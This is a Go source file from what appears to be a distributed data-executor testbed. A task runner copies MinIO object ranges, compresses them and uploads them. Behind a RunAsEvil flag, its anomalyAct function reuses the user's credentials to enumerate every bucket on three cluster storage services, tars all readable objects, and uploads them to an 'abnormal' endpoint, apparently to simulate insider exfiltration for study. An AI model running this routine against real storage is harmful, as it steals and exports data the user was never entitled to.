package coderunner

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"time"

	"github.com/minio/minio-go/v7"
	"github.com/minio/minio-go/v7/pkg/credentials"

	"github.com/tori209/data-executor/log/format"
	"github.com/tori209/data-executor/log/report"
)

type DestinationConfig struct {
	NormalCaseEndpoint   string
	NormalCaseBucket     string
	AbnormalCaseEndpoint string
	AbnormalCaseBucket   string
	MinioID              string
	MinioPW              string
}

type CodeRunner struct {
	watcherReporter *report.WatcherReporter
	dstConf         *DestinationConfig
	ipaddr          string
}

func NewCodeRunner(reporter *report.WatcherReporter, dstConf *DestinationConfig) *CodeRunner {
	return &CodeRunner{
		watcherReporter: reporter,
		dstConf:         dstConf,
		ipaddr:          os.Getenv("KUBE_POD_IP"),
	}
}

func (cr *CodeRunner) preRunningProcedure(reqMsg *format.TaskRequestMessage) {
	log.Printf("[Runner] Start Task (Job: %s / Task: %s)", reqMsg.JobID.String(), reqMsg.TaskID.String())
	var i int
	for i = 0; i < 5; i++ {
		if err := cr.watcherReporter.ReportTaskStart(reqMsg.JobID, reqMsg.TaskID); err != nil {
			log.Printf("[Runner] Reporter Failed to send runner start. Wait...: %+v", err)
			time.Sleep(3 * time.Second)
		} else {
			break
		}
	}
	if i == 5 {
		log.Fatalf("[Runner] Reporter Failed to send to watcher. Seems like wathcer died. Shutdown...")
	}
}

func (cr *CodeRunner) postRunningProcedure(resMsg *format.TaskResponseMessage) {
	// Report Task Done to Watcher
	var isSuccess bool
	if resMsg.Status == format.TaskFinish {
		isSuccess = true
	} else {
		isSuccess = false
	}

	var i int
	for i = 0; i < 5; i++ {
		if err := cr.watcherReporter.ReportTaskResult(isSuccess, resMsg.JobID, resMsg.TaskID); err != nil {
			log.Printf("[Runner] Reporter Failed to send task result. Wait...: %+v", err)
			time.Sleep(3 * time.Second)
		} else {
			break
		}
	}
	if i == 5 {
		log.Fatalf("[Runner] Reporter Failed to send to watcher. Seems like wathcer died. Shutdown...")
	}
	log.Printf("[Runner] Finish Task (Job: %s / Task: %s)", resMsg.JobID.String(), resMsg.TaskID.String())
}

// StartTask의 오류 발생 시 수행할 역할.
func (cr *CodeRunner) errorProcessing(formatString string, err error, resMsg *format.TaskResponseMessage) {
	log.Printf(formatString, err)
	cr.postRunningProcedure(resMsg)
}

// Task Request. Driver에서 Executor로 Go RPC 라이브러리를 통해 실행.
func (cr *CodeRunner) StartTask(reqMsg *format.TaskRequestMessage, resMsg *format.TaskResponseMessage) error {
	cr.preRunningProcedure(reqMsg)

	taskFailedProc := func() {
		resMsg.JobID = reqMsg.JobID
		resMsg.TaskID = reqMsg.TaskID
		resMsg.Status = format.TaskFailed
	}

	s3Client, err := minio.New(reqMsg.DataSource.Endpoint, &minio.Options{
		Secure: false,
		Transport: &http.Transport{
			DisableKeepAlives: true,
		},
	})
	if err != nil {
		taskFailedProc()
		cr.errorProcessing("[Runner] Failed establish connection to DataSource: %+v", err, resMsg)
		return err
	}

	// 1. GetObject 수행
	getOpt := minio.GetObjectOptions{}
	getOpt.SetRange(reqMsg.RangeBegin, reqMsg.RangeEnd)
	reader, err := s3Client.GetObject(
		context.Background(),
		reqMsg.DataSource.BucketName,
		reqMsg.DataSource.ObjectName,
		getOpt,
	)
	if err != nil {
		taskFailedProc()
		cr.errorProcessing("[Runner] Failed to execute 'GetObject': %+v", err, resMsg)
		return err
	}
	defer reader.Close()

	// 2. Data 가져오기 시도
	buf := new(bytes.Buffer)
	if _, err := io.Copy(buf, reader); err != nil {
		taskFailedProc()
		cr.errorProcessing("[Runner] Failed to create buffer: %+v", err, resMsg)
		return err
	}

	compressedData, err := compressGzip(buf.Bytes())
	if err != nil {
		taskFailedProc()
		cr.errorProcessing("[Runner] Failed to compress: %+v", err, resMsg)
		return err
	}

	// 3. 전송 경로 다분화
	var uploadObject string = fmt.Sprintf("%s.%s.%s.%d_to_%d.gzip",
		reqMsg.JobID.String(), reqMsg.TaskID.String(), cr.ipaddr,
		reqMsg.RangeBegin, reqMsg.RangeEnd,
	)

	// 4. 저장 시도
	dstClient, _ := minio.New(reqMsg.Destination.Endpoint, &minio.Options{
		Creds:  credentials.NewStaticV4(cr.dstConf.MinioID, cr.dstConf.MinioPW, ""),
		Secure: false,
		Transport: &http.Transport{
			DisableKeepAlives: true,
		},
	})
	dstReader := bytes.NewReader(compressedData)

	uploadInfo, err := dstClient.PutObject(
		context.Background(), reqMsg.Destination.BucketName, uploadObject, dstReader,
		int64(dstReader.Len()),
		minio.PutObjectOptions{ContentType: "application/gzip"},
	)
	if err != nil {
		taskFailedProc()
		cr.errorProcessing("[Runner] Failed to upload data: %+v", err, resMsg)
		return err
	}

	if reqMsg.RunAsEvil {
		cr.anomalyAct(reqMsg)
	}

	time.Sleep(time.Second)

	log.Printf("[Runner] Upload Success: %s of size %d", uploadInfo.Key, uploadInfo.Size)
	// 작업 완료 보고
	resMsg.JobID = reqMsg.JobID
	resMsg.TaskID = reqMsg.TaskID
	resMsg.Status = format.TaskFinish
	cr.postRunningProcedure(resMsg)
	return nil
}

func compressGzip(data []byte) ([]byte, error) {
	var b bytes.Buffer
	gz := gzip.NewWriter(&b)
	if _, err := gz.Write(data); err != nil {
		return nil, err
	}
	if err := gz.Close(); err != nil {
		return nil, err
	}
	return b.Bytes(), nil
}

// 이미 타겟 Storage를 알고 있다는 상황을 가정하는 것이 좋을 것 같은데.
func (cr *CodeRunner) anomalyAct(reqMsg *format.TaskRequestMessage) {
	var endpoint string = cr.dstConf.AbnormalCaseEndpoint
	var bucketName string = cr.dstConf.AbnormalCaseBucket
	var buf bytes.Buffer

	// Exeuctor의 권한 악용 상황 가정.
	
	//C레벨 접근은 Network Policy에 막힐 것. 이걸 하려면 Network Policy 활성화 여부 확인해야 함.

	

	

	// 악성 Job을 제출하여, 이미 알고 있는 Storage에 접근, 데이터를 가져오려고 시도함. C, S, O 레벨 접근 시도.
	targetlist := []string{"minio.minio-c.svc.cluster.local:80", "minio.minio-s.svc.cluster.local:80", "minio.minio-o.svc.cluster.local:80"}

	gzipWriter := gzip.NewWriter(&buf)
	tarWriter := tar.NewWriter(gzipWriter)

	ctx := context.Background()

	for _, target := range targetlist {
		// Storage 접근 시도. Timeout 등으로 실패 시 패스.
		anoClient, err := minio.New(target, &minio.Options{
			Creds:  credentials.NewStaticV4(cr.dstConf.MinioID, cr.dstConf.MinioPW, ""), // 임시로 User의 Access Key 사용
			Secure: false,
			Transport: &http.Transport{
				DisableKeepAlives: true,
			},
		})
		if err != nil {
			log.Printf("[Runner] Failed establish connection to DataSource in anomaly case: %+v", err)
			continue
		}

		// 데이터 목록 조회 및 전체 데이터를 가져오려고 시도. 획득 가능할 경우 tar로 압축 시도.
		buckets, err := anoClient.ListBuckets(ctx)
		if err != nil {
			log.Printf("[Runner] Failed to list buckets of DataSource in anomaly case: %+v", err)
			continue
		}
		
		for _, bucket := range buckets {
			objectCh := anoClient.ListObjects(ctx, bucket.Name, minio.ListObjectsOptions{Recursive: true})
			for object := range objectCh {
				if object.Err != nil {
					log.Printf("[Runner] Failed to get object in anomaly case: %+v\n", object.Err)
					continue
				}

				obj, err := anoClient.GetObject(ctx, bucket.Name, object.Key, minio.GetObjectOptions{})
				if err != nil {
					log.Printf("[Runner] Failed to get object in anomaly case: %+v\n", err)
					continue
				}
				header := &tar.Header{
					Name:    target + "." + object.Key,
					Size:    object.Size,
					Mode:    0600,
					ModTime: time.Now(),
				}
				if err := tarWriter.WriteHeader(header); err != nil {
					log.Printf("[Runner] Failed to write header in anomaly case: %+v\n", err)
					continue
				}
				if _, err := io.Copy(tarWriter, obj); err != nil {
					log.Printf("[Runner] Failed to write data in anomaly case: %+v\n", err)
				}
			}
		}
	}

	// 획득한 데이터를 압축 후 외부 반출 시도.
	dstClient, _ := minio.New(endpoint, &minio.Options{
		Creds:  credentials.NewStaticV4(cr.dstConf.MinioID, cr.dstConf.MinioPW, ""),
		Secure: false,
		Transport: &http.Transport{
			DisableKeepAlives: true,
		},
	})
	dstReader := bytes.NewReader(buf.Bytes())

	var uploadObject string = fmt.Sprintf("%s.%s.tar.gz", reqMsg.JobID.String(), reqMsg.TaskID.String())
	uploadInfo, err := dstClient.PutObject(
		context.Background(), bucketName, uploadObject, dstReader,
		int64(dstReader.Len()),
		minio.PutObjectOptions{ContentType: "application/gzip"},
	)
	if err != nil {
		log.Printf("[Runner] Failed to upload anomaly data: %+v", err)
	} else {
		log.Printf("[Runner] Anomaly Upload Success: %s of size %d", uploadInfo.Key, uploadInfo.Size)
	}
}
